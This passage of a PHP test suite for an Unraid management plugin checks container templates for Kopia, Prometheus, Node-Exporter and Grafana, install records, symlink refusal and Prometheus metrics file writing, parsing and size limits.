    same('advisor: a share that is no link stays', '/mnt/user/zz-uso-no-such-share/a', advisorUnraidPath('/mnt/user/zz-uso-no-such-share/a'));
    $tmp = hardeningTmp('advisor-install');
    $GLOBALS['advisorRecordFile'] = "$tmp/record/installs.json";       // his record of what he prepared: never the test copy's data
    mkdir("$tmp/appdata");
    mkdir("$tmp/tu");
    $env = ['appdata' => "$tmp/appdata", 'ip' => '192.0.2.10', 'templates' => ADVISOR_TEMPLATE_DIR, 'user_templates' => "$tmp/tu",
            'prepared' => "$tmp/prepared", 'containers' => [], 'dashboard' => ADVISOR_DASHBOARD_FILE, 'snapshots' => ADVISOR_SNAPSHOTS,
            'restore' => ADVISOR_RESTORE, 'metrics' => ADVISOR_METRICS_DIR, 'uid' => posix_getuid(), 'gid' => posix_getgid()];
    $formModes = ['rw', 'rw,slave', 'rw,shared', 'ro', 'ro,slave', 'ro,shared'];   // Unraid's form (CreateDocker.php): anything else becomes rw
    $byTarget = fn (array $t) => array_column($t['config'], null, 'target');
    foreach (['kopia' => 'kopia', 'nodeexporter' => 'Node-Exporter', 'prometheus' => 'prometheus', 'grafana' => 'Grafana'] as $id => $name) {
        $t = advisorTemplate($id, $env);
        same("advisor template $id: the container's name", $name, $t['name']);
        check("advisor template $id: everything filled in, no comment", !str_contains($t['xml'], '{{') && !str_contains($t['xml'], '<!--'));
        $c = $byTarget($t);
        same("advisor template $id: marked", ['Label', 'consultant'], [$c[ADVISOR_LABEL]['type'] ?? null, $c[ADVISOR_LABEL]['value'] ?? null]);
        same("advisor template $id: path modes Unraid's form knows", [],
            array_values(array_filter($t['config'], fn ($x) => $x['type'] === 'Path' && !in_array($x['mode'], $formModes, true))));
        same("advisor template $id: no markup in names and descriptions (the form puts them into HTML)", [],
            array_values(array_filter($t['config'], fn ($x) => preg_match('/[<>]/', $x['name']) === 1)));
        check("advisor template $id: no markup in the XML's descriptions", !preg_match('/Description="[^"]*(&lt;|&gt;)/', $t['xml']));
    }
    $k = $byTarget(advisorTemplate('kopia', $env));
    same('advisor kopia: the snapshots read-only at /uso', [ADVISOR_SNAPSHOTS, 'ro,slave'], [$k['/uso']['value'], $k['/uso']['mode']]);
    same('advisor kopia: the restore folder writable', [ADVISOR_RESTORE, 'rw'], [$k['/uso-restore']['value'], $k['/uso-restore']['mode']]);
    same('advisor kopia: root, appdata', ['0', '0', "$tmp/appdata/kopia"], [$k['PUID']['value'], $k['PGID']['value'], $k['/config']['value']]);
    same('advisor kopia: the WebUI password masked and empty', [true, ''], [$k['PASSWORD']['mask'], $k['PASSWORD']['value']]);
    $n = advisorTemplate('nodeexporter', $env);
    check('advisor node exporter: reads the office\'s folder', in_array(ADVISOR_METRICS_DIR, advisorTextfileDirs(preg_split('/\s+/', $n['post']), [['/', '/host']]), true));
    // a plain "ro" path: Docker picks rslave by itself for a source that holds its root; asked for
    // explicitly ("slave", "rslave") it refuses on Unraid, whose / is a private mount
    same('advisor node exporter: the host read-only, nothing explicit', ['ro', '--pid=host'], [$byTarget($n)['/host']['mode'], $n['extra']]);
    $g = $byTarget(advisorTemplate('grafana', $env));
    same('advisor grafana: provisioning inside its appdata', ADVISOR_GRAFANA_PROV, $g['GF_PATHS_PROVISIONING']['value']);
    same('advisor grafana: the admin password masked and empty', [true, ''], [$g['GF_SECURITY_ADMIN_PASSWORD']['mask'], $g['GF_SECURITY_ADMIN_PASSWORD']['value']]);
    same('advisor grafana: the real address', 'http://192.0.2.10:3000/', $g['GF_SERVER_ROOT_URL']['value']);
    same('advisor grafana: anonymous viewing off unless chosen', ['false', 'true'],
        [$g['GF_AUTH_ANONYMOUS_ENABLED']['value'], $byTarget(advisorTemplate('grafana', $env, ['anon' => true]))['GF_AUTH_ANONYMOUS_ENABLED']['value']]);
    $public = advisorInstallPublic(advisorInstallPlan('grafana', $env));
    same('advisor plan: masked values never in the preview', '', array_column($public['config'], null, 'target')['GF_SECURITY_ADMIN_PASSWORD']['value']);
    check('advisor plan: no file contents in the preview', !isset($public['files'][0]['content']));

    // what he refuses
    $cnt = fn (string $name, string $image) => [$name => ['name' => $name, 'image' => $image, 'running' => true]];
    same('advisor refuses: Kopia is there (by image)', 'ad_there',
        advisorInstallRefusal('kopia', 'kopia', ['containers' => $cnt('backup-thing', 'ghcr.io/imagegenius/kopia')] + $env)['key'] ?? null);
    same('advisor refuses: nothing in the way', null, advisorInstallRefusal('kopia', 'kopia', $env));
    touch("$tmp/tu/my-Kopia.xml");
    same('advisor refuses: a template of that name (any case)', ['ad_template_taken', 'my-Kopia.xml'],
        [advisorInstallRefusal('kopia', 'kopia', $env)['key'] ?? null, advisorInstallRefusal('kopia', 'kopia', $env)['params']['file'] ?? null]);
    same('advisor refuses: Grafana without the server\'s address', 'ad_no_ip', advisorInstallRefusal('grafana', 'Grafana', ['ip' => null] + $env)['key'] ?? null);
    same('advisor refuses: no appdata', 'ad_appdata', advisorInstallRefusal('grafana', 'Grafana', ['appdata' => "$tmp/none"] + $env)['key'] ?? null);
    same('advisor scan: appdata not looked at', null, advisorInstallRefusal('grafana', 'Grafana', ['appdata' => "$tmp/none"] + $env, false));
    try {
        advisorInstallPrepare('kopia', [], $env);
        check('advisor prepare: refused over a template', false);
    } catch (Problem $p) {
        same('advisor prepare: refused over a template', 'ad_template_taken', $p->key);
    }
    same('advisor prepare: nothing prepared then', false, is_dir("$tmp/prepared"));

    // Prometheus: its yml only where none is, the form's address
    $r = advisorInstallPrepare('prometheus', [], $env);
    $yml = "$tmp/appdata/prometheus/etc/prometheus.yml";
    check('advisor prometheus: yml written with the address', str_contains((string) @file_get_contents($yml), "targets: ['192.0.2.10:9100']"));
    check('advisor prometheus: data folder there', is_dir("$tmp/appdata/prometheus/data"));
    same('advisor prometheus: the form\'s address', ADVISOR_ADD_CONTAINER . "$tmp/prepared/prometheus.xml", $r['url']);
    check('advisor prometheus: the template in its folder', is_file("$tmp/prepared/prometheus.xml"));
    file_put_contents($yml, "mine\n");
    $r = advisorInstallPrepare('prometheus', [], $env);
    same('advisor prometheus: an existing yml stays', ["mine\n", [], [$yml]], [file_get_contents($yml), $r['written'], $r['kept']]);
    same('advisor prometheus: no temporary files left', [], glob("$tmp/appdata/prometheus/etc/.*.tmp") ?: []);

    // Grafana: the data source, the provider and the dashboard, there at its first start
    $r = advisorInstallPrepare('grafana', [], $env);
    $prov = "$tmp/appdata/grafana/provisioning";
    $ds = (string) @file_get_contents("$prov/datasources/uso-prometheus.yaml");
    check('advisor grafana: the data source', str_contains($ds, 'uid: ' . ADVISOR_DS_UID) && str_contains($ds, 'url: http://192.0.2.10:9090')
        && str_contains($ds, 'isDefault: true'));
    check('advisor grafana: the provider reads its folder', str_contains((string) @file_get_contents("$prov/dashboards/uso.yaml"), 'path: ' . ADVISOR_GRAFANA_PROV . '/dashboards/uso'));
    $dash = (string) @file_get_contents("$prov/dashboards/uso/unraid-secretary-office.json");
    $dj = json_decode($dash, true);
    if (is_file(ADVISOR_DASHBOARD_FILE)) {
        check('advisor grafana: the dashboard with its data source filled in', is_array($dj) && !str_contains($dash, '${DS_PROMETHEUS}')
            && str_contains($dash, '"' . ADVISOR_DS_UID . '"') && !isset($dj['__inputs']) && ($dj['uid'] ?? '') === 'unraid-secretary-office');
    }
    same('advisor grafana: the provisioning files are the ones he checks', advisorGrafanaRels(is_file(ADVISOR_DASHBOARD_FILE)),
        array_keys(advisorGrafanaFiles('192.0.2.10', true, ADVISOR_GRAFANA_PROV, ADVISOR_DASHBOARD_FILE)));
    same('advisor grafana: the provisioning folders Grafana looks for, there and empty', [true, true, [], []],
        [is_dir("$prov/plugins"), is_dir("$prov/alerting"), array_values(array_diff(scandir("$prov/plugins") ?: [], ['.', '..'])),
         array_values(array_diff(scandir("$prov/alerting") ?: [], ['.', '..']))]);
    same('advisor grafana: his record says which form he prepared', ['Grafana', 'grafana/grafana'],
        [end(json_decode((string) file_get_contents("$tmp/record/installs.json"), true)['installs'])['name'] ?? null,
         end(json_decode((string) file_get_contents("$tmp/record/installs.json"), true)['installs'])['image'] ?? null]);
    same('advisor grafana: an existing Grafana keeps its default data source', true,
        str_contains(advisorGrafanaFiles('192.0.2.10', false, ADVISOR_GRAFANA_PROV, null)['datasources/uso-prometheus.yaml'][1], 'isDefault: false'));

    // never through a link
    mkdir("$tmp/appdata2");
    mkdir("$tmp/elsewhere");
    symlink("$tmp/elsewhere", "$tmp/appdata2/prometheus");
    try {
        advisorInstallPrepare('prometheus', [], ['appdata' => "$tmp/appdata2"] + $env);
        check('advisor: a link in appdata refused', false);
    } catch (Problem $p) {
        same('advisor: a link in appdata refused', 'ad_link', $p->key);
    }
    same('advisor: nothing written behind the link', [], array_values(array_diff(scandir("$tmp/elsewhere") ?: [], ['.', '..'])));

    // facts from docker inspect: the web page, Kopia's folders, Grafana's provisioning
    $inspect = fn (string $mode, array $bind, string $own = '') => ['Config' => ['Labels' => ['net.unraid.docker.webui' => 'http://[IP]:[PORT:51515]/']],
        'HostConfig' => ['NetworkMode' => $mode, 'PortBindings' => $bind], 'NetworkSettings' => ['Networks' => [$mode => ['IPAddress' => $own]]]];
    same('advisor web page: a published port', 'http://192.0.2.10:51600/', advisorWebUi($inspect('bridge', ['51515/tcp' => [['HostPort' => '51600']]], '172.17.0.5'), '192.0.2.10'));
    same('advisor web page: br0 — the container\'s own address', 'http://192.168.21.158:51515/', advisorWebUi($inspect('br0.21', [], '192.168.21.158'), '192.0.2.10'));
    same('advisor web page: the host\'s network', 'http://192.0.2.10:51515/', advisorWebUi($inspect('host', []), '192.0.2.10'));
    same('advisor web page: none without the label', null, advisorWebUi(['Config' => []], '192.0.2.10'));
    $kopia = ['Mounts' => [
        ['Type' => 'bind', 'Source' => ADVISOR_SNAPSHOTS, 'Destination' => '/backup-snapshots', 'RW' => false],
        ['Type' => 'bind', 'Source' => "$tmp/appdata/kopia", 'Destination' => '/config', 'RW' => true],
        ['Type' => 'volume', 'Source' => '/var/lib/docker/volumes/x/_data', 'Destination' => '/source', 'RW' => true],
        ['Type' => 'bind', 'Source' => '/mnt/user/kopia_tmp', 'Destination' => '/cache', 'RW' => true],
        ['Type' => 'bind', 'Source' => '/mnt/user/appdata/kopia/local/', 'Destination' => '/local', 'RW' => true],
        ['Type' => 'bind', 'Source' => ADVISOR_RESTORE, 'Destination' => ADVISOR_RESTORE_TARGET, 'RW' => true]],
        'Config' => ['Env' => ['PUID=0']]];
    mkdir("$tmp/appdata/kopia");
    $ki = advisorKopiaInfo(['name' => 'kopia', 'running' => true], $kopia);
    same('advisor kopia: where it sees the snapshots', '/backup-snapshots', $ki['sources']['target'] ?? null);
    same('advisor kopia: the restore folder', ADVISOR_RESTORE_TARGET, $ki['restore']['target'] ?? null);
    same('advisor kopia: folders for a repository', [['host' => '/mnt/user/appdata/kopia/local', 'target' => '/local']], $ki['folders']);
    same('advisor kopia: not connected without repository.config', ['connected' => false], $ki['repo']);
    file_put_contents("$tmp/appdata/kopia/repository.config", json_encode(['storage' => ['type' => 's3', 'config' => [
        'bucket' => 'nostromo', 'endpoint' => 's3.example.test', 'accessKeyID' => 'AKIASECRETID', 'secretAccessKey' => 'very-secret-key']],
        'hostname' => 'kopia', 'username' => 'root']));
    $facts = advisorKopiaInfo(['name' => 'kopia', 'running' => true], $kopia)['repo'];
    same('advisor kopia: the facts of a connection', ['connected' => true, 'type' => 's3', 'bucket' => 'nostromo', 'endpoint' => 's3.example.test', 'client' => 'root@kopia'], $facts);
    check('advisor kopia: no key among the facts', !str_contains(json_encode($facts), 'SECRET') && !str_contains(json_encode($facts), 'very-secret'));
    same('advisor kopia: not looked at while it is stopped', null, advisorKopiaInfo(['name' => 'kopia', 'running' => false], $kopia)['repo']);
    $graf = fn (string $prov) => ['Mounts' => [['Type' => 'bind', 'Source' => "$tmp/appdata/grafana", 'Destination' => '/var/lib/grafana', 'RW' => true]],
        'Config' => ['Env' => ["GF_PATHS_PROVISIONING=$prov"]]];
    $gi = advisorGrafanaInfo(['name' => 'Grafana', 'running' => true], $graf('/etc/grafana/provisioning'));
    same('advisor grafana as on nostromo: reads its own folder, the files would wait in appdata', [false, "$tmp/appdata/grafana/provisioning", ADVISOR_GRAFANA_PROV],
        [$gi['points'], $gi['host'], $gi['inside']]);
    $gi = advisorGrafanaInfo(['name' => 'Grafana', 'running' => true], $graf(ADVISOR_GRAFANA_PROV));
    same('advisor grafana pointed there: all set up', [true, true], [$gi['points'], advisorGrafanaPublic($gi)['done']]);

    // a plugin job, read back
    $base = "$tmp/job";
    file_put_contents("$base.json", json_encode(['id' => 'fcp', 'plugin' => 'fix.common.problems', 'url' => 'x', 'started' => time()]));
    file_put_contents("$base.out", "plugin: downloading\e[1m bold\e[0m\nplugin: done\n");
    same('advisor job: running without an exit code', 'running', advisorJob($base)['state'] ?? null);
    same('advisor job: its output without terminal codes', "plugin: downloading bold\nplugin: done\n", advisorJob($base)['output'] ?? null);
    file_put_contents("$base.done", "1\n");
    same('advisor job: failed', ['failed', 1], [advisorJob($base)['state'] ?? null, advisorJob($base)['exit'] ?? null]);
    file_put_contents("$base.done", "0\n");
    check('advisor job: done only when Unraid lists it', in_array(advisorJob($base)['state'] ?? null, ['done', 'unregistered'], true)
        && (advisorJob($base)['state'] === 'done') === (is_file('/var/log/plugins/fix.common.problems.plg') && is_file(HOUSE_PLUGINS . '/fix.common.problems.plg')));
    file_put_contents("$base.json", json_encode(['id' => 'nothing-of-his']));
    same('advisor job: only his externals', null, advisorJob($base));

    // the plugin addresses the page shows for installing by hand are the ones he installs
    $js = (string) file_get_contents(OFFICE_WEB . '/desks/advisor/desk.js');
    foreach (ADVISOR_EXTERNALS as $id => $how) {
        if (isset($how['plg'])) {
            check("advisor: desk.js shows the same address for $id", str_contains($js, "'" . $how['plg'] . "'"));
        }
    }
    unset($GLOBALS['advisorRecordFile'], $GLOBALS['advisorPrepared']);
    hardeningRm($tmp);
}

/**
 * The consultant's record of what he installed (root only, kept small) and his re-look after he prepared
 * Unraid's form; Grafana's admin password optional; Grafana's provisioning with the folders it looks for.
 */
function testAdvisorRecord(): void
{
    $tmp = hardeningTmp('advisor-record');
    $GLOBALS['advisorRecordFile'] = "$tmp/advisor/installs.json";
    $now = 1791300000;
    check('advisor record: written', advisorRecord(['kind' => 'plugin', 'id' => 'fcp', 'name' => 'fix.common.problems', 'url' => 'u'], $now - 40 * 86400)
        && advisorRecord(['kind' => 'plugin', 'id' => 'filesviewer', 'name' => 'filesviewer', 'url' => 'v'], $now));
    $rec = json_decode((string) file_get_contents("$tmp/advisor/installs.json"), true);
    same('advisor record: folder 0700 and file 0600 of root\'s, older than 30 days dropped', [0700, 0600, 0, [['t' => $now, 'kind' => 'plugin', 'id' => 'filesviewer', 'name' => 'filesviewer', 'url' => 'v']]],
        [fileperms("$tmp/advisor") & 0777, fileperms("$tmp/advisor/installs.json") & 0777, fileowner("$tmp/advisor/installs.json"), $rec['installs'] ?? null]);
    for ($i = 0; $i < 25; $i++) {
        advisorRecord(['kind' => 'container', 'id' => 'kopia', 'name' => 'kopia', 'image' => "img$i"], $now + $i);
    }
    $rec = json_decode((string) file_get_contents("$tmp/advisor/installs.json"), true)['installs'] ?? [];
    same('advisor record: the newest ' . ADVISOR_RECORD_MAX, [ADVISOR_RECORD_MAX, 'img24'], [count($rec), end($rec)['image'] ?? null]);
    chmod("$tmp/advisor/installs.json", 0666);
    chmod("$tmp/advisor", 0777);
    advisorRecord(['kind' => 'plugin', 'id' => 'fcp', 'name' => 'fix.common.problems', 'url' => 'u'], $now + 100);
    $rec = json_decode((string) file_get_contents("$tmp/advisor/installs.json"), true)['installs'] ?? [];
    same('advisor record: one others could write is not read — begins anew, root\'s again', [1, 0700, 0600],
        [count($rec), fileperms("$tmp/advisor") & 0777, fileperms("$tmp/advisor/installs.json") & 0777]);
    advisorRecord(['kind' => 'container', 'id' => 'kopia', 'name' => 'kopia', 'image' => 'img'], $now + 200);
    unset($GLOBALS['advisorPrepared']);
    advisorPreparedRestore($now + 200 + ADVISOR_RELOOK_FOR + 1);
    $late = $GLOBALS['advisorPrepared'] ?? null;
    advisorPreparedRestore($now + 500);
    same('advisor: after an agent restart a form he prepared lately is still looked after (not one from long ago)',
        [null, ['id' => 'kopia', 'at' => $now + 200]], [$late, $GLOBALS['advisorPrepared'] ?? null]);
    unset($GLOBALS['advisorPrepared'], $GLOBALS['advisorRecordFile']);
    hardeningRm($tmp);

    // the re-look after a prepared form
    $kopia = ['kopia' => ['name' => 'kopia', 'image' => 'ghcr.io/imagegenius/kopia', 'running' => true]];
    same('advisor re-look: wait, the container came (scan), given up after a while, an unknown id',
        ['wait', 'scan', 'stop', 'stop'],
        [advisorRelookDue(['id' => 'kopia', 'at' => $now], [], $now + 60), advisorRelookDue(['id' => 'kopia', 'at' => $now], $kopia, $now + 60),
         advisorRelookDue(['id' => 'kopia', 'at' => $now], [], $now + ADVISOR_RELOOK_FOR + 1), advisorRelookDue(['id' => 'nothing', 'at' => $now], $kopia, $now)]);
    same('advisor: his page looks again when his state is older than a minute', 60,
        json_decode((string) file_get_contents(OFFICE_WEB . '/desks/advisor/desk.json'), true)['refresh_after'] ?? null);

    // Grafana: the admin password optional (admin/admin, Grafana asks at the first login) — the warning stays on the page
    $xml = (string) file_get_contents(ADVISOR_TEMPLATE_DIR . '/grafana.xml');
    check('advisor grafana: the admin password optional', (bool) preg_match('/<Config Name="GF_SECURITY_ADMIN_PASSWORD"[^>]*\sRequired="false"[^>]*Mask="true"/', $xml));
    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
        $lang = json_decode((string) file_get_contents(OFFICE_WEB . "/desks/advisor/lang/$l.json"), true);
        check("advisor grafana ($l): the form's note and the dashboard say admin/admin", str_contains($lang['ci.grafana'] ?? '', 'admin/admin')
            && str_contains($lang['dashboard.admin'] ?? '', 'admin/admin') && str_contains($lang['ui.grafana'] ?? '', 'admin/admin'));
    }
    check('advisor grafana: the admin/admin warning shown also for his own Grafana',
        !str_contains((string) file_get_contents(OFFICE_WEB . '/desks/advisor/desk.js'), "if (!g.by_consultant) main.appendChild(el('div', 'row-detail ad-careful', T('dashboard.admin')))"));
}

/**
 * Reads Prometheus' text format back the way a strict parser does: HELP and
 * TYPE before a family's series, label values escaped, the same label names
 * within a family, no series twice, no family twice.
 *
 * @return array<string, array{type:string, help:string, samples:list<array{0:array<string,string>, 1:string}>}>|string  the families, or what is wrong
 */
function metricsParseBack(string $text): array|string
{
    $value = '"(?:[^"\\\\\n]|\\\\[\\\\"n])*"';
    $sample = '/^([a-zA-Z_][a-zA-Z0-9_]*)(?:\{([a-zA-Z_][a-zA-Z0-9_]*=' . $value . '(?:,[a-zA-Z_][a-zA-Z0-9_]*=' . $value . ')*)\})? (-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?|NaN|[+-]Inf)$/D';
    if ($text !== '' && !str_ends_with($text, "\n")) {
        return 'no newline at the end';
    }
    $families = [];
    $current = null;
    foreach (explode("\n", rtrim($text, "\n")) as $n => $line) {
        if (preg_match('/^# HELP ([a-zA-Z_][a-zA-Z0-9_]*) ((?:[^\\\\\n]|\\\\[\\\\n])*)$/D', $line, $m)) {
            if (isset($families[$m[1]])) {
                return "line $n: $m[1] twice";
            }
            $families[$m[1]] = ['type' => '', 'help' => $m[2], 'samples' => []];
            $current = $m[1];
        } elseif (preg_match('/^# TYPE ([a-zA-Z_][a-zA-Z0-9_]*) (gauge|counter)$/D', $line, $m)) {
            if ($m[1] !== $current || $families[$current]['type'] !== '') {
                return "line $n: TYPE out of place";
            }
            $families[$current]['type'] = $m[2];
        } elseif (preg_match($sample, $line, $m)) {
            if ($m[1] !== $current || $families[$current]['type'] === '') {
                return "line $n: a series without its HELP and TYPE";
            }
            preg_match_all('/([a-zA-Z_][a-zA-Z0-9_]*)=("(?:[^"\\\\\n]|\\\\[\\\\"n])*")/', $m[2] ?? '', $pairs, PREG_SET_ORDER);
            $labels = [];
            foreach ($pairs as [, $k, $v]) {
                $labels[$k] = stripcslashes(substr($v, 1, -1));
            }
            foreach ($families[$current]['samples'] as [$other]) {
                if (array_keys($other) !== array_keys($labels)) {
                    return "line $n: other label names than before";
                }
                if ($other === $labels) {
                    return "line $n: the same series twice";
                }
            }
            $families[$current]['samples'][] = [$labels, $m[3]];
        } else {
            return "line $n: not Prometheus' format: " . json_encode($line);
        }
    }
    return $families;
}

/** The office's numbers for Prometheus: the text format, what is left out, the size cap, the files, the desks' hooks */
function testMetrics(): void
{
    $GLOBALS['metricsNoted'] = [];
    $g = fn (string $name, array $samples, string $type = 'gauge') => ['name' => $name, 'type' => $type, 'help' => "about $name", 'samples' => $samples];

    // escaping: backslash, quote and newline in label values; backslash and newline in HELP
    $fam = metricsClean(['backup' => [['name' => 'uso_test_bytes', 'type' => 'gauge', 'help' => "two\nlines \\ and \"quotes\"",
        'samples' => [[['name' => "a\"b\\c\nd", 'kind' => 'app'], 12], [['kind' => 'vm', 'name' => 'Win 11'], 3.5]]]]]);
    same('metrics: text format with escapes', "# HELP uso_test_bytes two\\nlines \\\\ and \"quotes\"\n# TYPE uso_test_bytes gauge\n"
        . "uso_test_bytes{kind=\"app\",name=\"a\\\"b\\\\c\\nd\"} 12\nuso_test_bytes{kind=\"vm\",name=\"Win 11\"} 3.5\n", metricsRender($fam['backup']));
    $back = metricsParseBack(metricsRender($fam['backup']));
    same('metrics: escaped label value reads back', "a\"b\\c\nd", is_array($back) ? $back['uso_test_bytes']['samples'][0][0]['name'] : $back);
    same('metrics: numbers', ['1', '0', '7', '0.25', 'NaN', '+Inf', '-Inf', '1.0E+25'],
        array_map('metricsNumber', [1, 0, 7.0, 0.25, NAN, INF, -INF, 1e25]));
    same('metrics: a label value is cut to 200 bytes, control characters become spaces', [200, "a b"],
        [strlen(metricsLabelValue(str_repeat('é', 150))), metricsLabelValue("a\tb")]);

    // what doesn't fit Prometheus is left out — the rest stays
    $clean = metricsClean([
        'snapshot' => [
            $g('uso_ok', [[[], true], [['x' => '1'], 2]]),                      // other label names: the second goes
            $g('9uso_bad', [[[], 1]]), $g('uso-bad', [[[], 1]]), $g("uso_bad\n", [[[], 1]]), $g('other_metric', [[[], 1]]),
            $g('uso_type', [[[], 1]], 'histogram'),
            $g('uso_labels', [[['__name__' => 'x'], 1], [['a-b' => 'x'], 1], [["a\n" => 'x'], 1], [['a' => ['x']], 1], [['a' => 'x'], 'one'], [['a' => 'y'], 2]]),
            $g('uso_twice', [[['a' => 'x'], 1], [['a' => 'x'], 2]]),
            $g('uso_empty', []),
            'not a family',
        ],
        'backup' => [$g('uso_ok', [[[], 5]]), $g('uso_more', [[[], false]])],    // uso_ok again: the first desk keeps it
        'Bad-Area' => [$g('uso_area', [[[], 1]])],
    ]);
    same('metrics: valid families kept, by area', ['snapshot' => ['uso_ok', 'uso_labels', 'uso_twice'], 'backup' => ['uso_more']],
        array_map(fn ($fs) => array_column($fs, 'name'), $clean));
    same('metrics: one series per label set, only the first label names', [[[], '1']], $clean['snapshot'][0]['samples']);
    same('metrics: odd labels left out', [[['a' => 'y'], '2']], $clean['snapshot'][1]['samples']);
    same('metrics: a series twice — the first stays', [[['a' => 'x'], '1']], $clean['snapshot'][2]['samples']);
    same('metrics: false is 0', '0', $clean['backup'][0]['samples'][0][1]);
    check('metrics: anchored names', preg_match(METRICS_NAME, "uso_x\n") === 0 && preg_match(METRICS_FILE, "uso_x.prom\n") === 0);

    // the size cap: per-item series go first, then whole areas — never above the budget
    $many = array_map(fn ($i) => [['kind' => 'app', 'name' => "app-$i"], $i * 1000], range(1, 120));
    $areas = metricsClean(['backup' => [$g('uso_backup_package_bytes', $many), $g('uso_backup_running', [[[], 0]])],
                           'snapshot' => [$g('uso_snapshot_snapshots', [[['pool' => 'a'], 1], [['pool' => 'b'], 2]])]]);
    [$texts, $dropped] = metricsFit($areas, 2000);
    same('metrics cap: the family with the most series goes first', ['uso_backup_package_bytes'], $dropped);
    check('metrics cap: within the budget', array_sum(array_map('strlen', $texts)) <= 2000);
    [$texts, $dropped] = metricsFit($areas, 150);
    check('metrics cap: per-item ones before single numbers', $dropped[0] === 'uso_backup_package_bytes' && $dropped[1] === 'uso_snapshot_snapshots'
        && array_sum(array_map('strlen', $texts)) <= 150, json_encode($dropped));
    same('metrics cap: nothing left out when it fits', [], metricsFit($areas, 100000)[1]);

    // the files: one per area plus the office's, temp files in the same folder never "*.prom", stale ones go, foreign ones stay
    $dir = hardeningTmp('metrics') . '/metrics';
    $now = time();
    @mkdir(dirname($dir) . '/base', 0755);
    check('metrics folder: made below an existing parent', metricsEnsureDir($dir) && is_dir($dir));
    file_put_contents("$dir/uso_gone.prom", "# a desk let go\n");
    file_put_contents("$dir/node_other.prom", "other_tool 1\n");
    file_put_contents("$dir/.uso_backup.prom.0a1b2c3d4e5f.tmp", 'left by a crash');
    touch("$dir/.uso_backup.prom.0a1b2c3d4e5f.tmp", $now - 3600);
    $big = array_map(fn ($i) => [['kind' => 'app', 'name' => str_repeat('x', 60) . "-$i"], $i], range(1, 400));
    $r = metricsWrite($now, ['backup' => [$g('uso_backup_running', [[[], 1]]), $g('uso_backup_package_bytes', $big)],
                             'caretaker' => [$g('uso_caretaker_open_findings', [[['level' => 'required'], 0]])]], $dir);
    $names = array_values(array_filter(scandir($dir) ?: [], fn ($n) => $n[0] !== '.'));
    same('metrics files: one per area and the office\'s, foreign ones untouched', ['node_other.prom', 'uso_backup.prom', 'uso_caretaker.prom', 'uso_office.prom'], $names);
    same('metrics files: no temporary file left (an old one from a crash removed)', [], array_values(array_diff(scandir($dir) ?: [], ['.', '..'], $names)));
    same('metrics files: the big per-item family was left out', ['uso_backup_package_bytes'], $r['dropped'] ?? null);
    $total = array_sum(array_map(fn ($n) => filesize("$dir/$n"), preg_grep('/^uso_.*\.prom$/', $names)));
    check("metrics files: all together within " . METRICS_MAX_BYTES . " bytes ($total)", $total <= METRICS_MAX_BYTES && $total === array_sum($r['files']));
    $office = metricsParseBack((string) file_get_contents("$dir/uso_office.prom"));
    check('metrics files: the office\'s file reads back', is_array($office), is_string($office) ? $office : '');
    same('metrics files: office info and when written', [[['version' => AGENT_VERSION], '1'], (string) $now, '1'],
        is_array($office) ? [$office['uso_office_info']['samples'][0], $office['uso_metrics_written_timestamp_seconds']['samples'][0][1],
                             $office['uso_metrics_dropped_families']['samples'][0][1]] : null);
    check('metrics files: every file reads back', array_reduce(preg_grep('/^uso_.*\.prom$/', $names), fn ($ok, $n) => $ok && is_array(metricsParseBack((string) file_get_contents("$dir/$n"))), true));
    check('metrics fresh: just written', metricsFresh($dir, $now) && !metricsFresh($dir, $now + METRICS_FRESH + 1));
    $tmp = writeNewFile("$dir/.uso_backup.prom", 'x');
    check('metrics: writeAtomic\'s temporary names are hidden and never end in .prom', $tmp !== null && preg_match(METRICS_TMP, basename($tmp)) === 1 && !str_ends_with($tmp, '.prom'));
    @unlink((string) $tmp);
    metricsWrite($now + 60, ['backup' => [$g('uso_backup_running', [[[], 0]])]], $dir);
    check('metrics files: an area that stops reporting loses its file', !file_exists("$dir/uso_caretaker.prom") && is_file("$dir/uso_backup.prom"));

    // never through a link
    $link = dirname($dir) . '/linked';
    symlink(dirname($dir) . '/base', $link);
    check('metrics folder: a link is refused', !metricsEnsureDir($link) && !metricsEnsureDir("$link/metrics") && !file_exists(dirname($dir) . '/base/metrics'));
    check('metrics folder: nothing without its base', metricsWrite($now, [], dirname($dir) . '/missing/metrics') === null);

    // a fresh Unraid has no /mnt/addons (Unassigned Devices' tmpfs): made as a plain folder, the office's below it;
    // gone again (a tmpfs mounted over it later) - made again; never through a link, never another owner's
    $fresh = dirname($dir) . '/fresh';
    mkdir($fresh, 0755);
    $addons = "$fresh/addons";
    $mine = "$addons/UnraidSecretaryOffice/metrics";
    $st = metricsEnsureDir($mine, $addons) ? @lstat($addons) : false;
    check('metrics base: missing - made as a plain folder of the agent\'s own, 0755, the office\'s folder below',
        $st && ($st['mode'] & 0170000) === 0040000 && ($st['mode'] & 0777) === 0755 && $st['uid'] === posix_geteuid() && is_dir($mine), json_encode($st ? [$st['mode'], $st['uid']] : null));
    check('metrics base: written into', is_array(metricsWrite($now, [], $mine)) && is_file("$mine/uso_office.prom"));
    exec('rm -rf ' . escapeshellarg("$addons/UnraidSecretaryOffice"));
    check('metrics base: the office\'s folder vanished - made again at the next look', metricsEnsureDir($mine, $addons) && is_dir($mine));
    same('metrics base: nothing else made in it', ['UnraidSecretaryOffice'], array_values(array_diff(scandir($addons) ?: [], ['.', '..'])));
    check('metrics base: there already - used as it is', metricsEnsureDir($mine, $addons) && is_dir($mine));
    symlink(dirname($dir) . '/base', "$fresh/addons-link");
    check('metrics base: a link is refused, nothing made through it',
        !metricsEnsureDir("$fresh/addons-link/UnraidSecretaryOffice/metrics", "$fresh/addons-link") && !file_exists(dirname($dir) . '/base/UnraidSecretaryOffice'));
    check('metrics base: not made where its parent is missing', !metricsEnsureDir("$fresh/none/addons/x", "$fresh/none/addons") && !file_exists("$fresh/none"));
    exec('rm -rf ' . escapeshellarg("$addons/UnraidSecretaryOffice"));
    symlink(dirname($dir) . '/base', "$addons/UnraidSecretaryOffice");
    check('metrics base: the office\'s folder a link - refused', !metricsEnsureDir($mine, $addons) && !file_exists(dirname($dir) . '/base/metrics'));
    unlink("$addons/UnraidSecretaryOffice");
    if (posix_geteuid() === 0) {
        mkdir("$addons/UnraidSecretaryOffice", 0755);
        chown("$addons/UnraidSecretaryOffice", 99);
        check('metrics base: the office\'s folder of another owner - refused', !metricsEnsureDir($mine, $addons) && !file_exists($mine));
    }

    // Mr. Backupsy's hook from the engine's state files
    $st = dirname($dir) . '/state';
    mkdir($st);
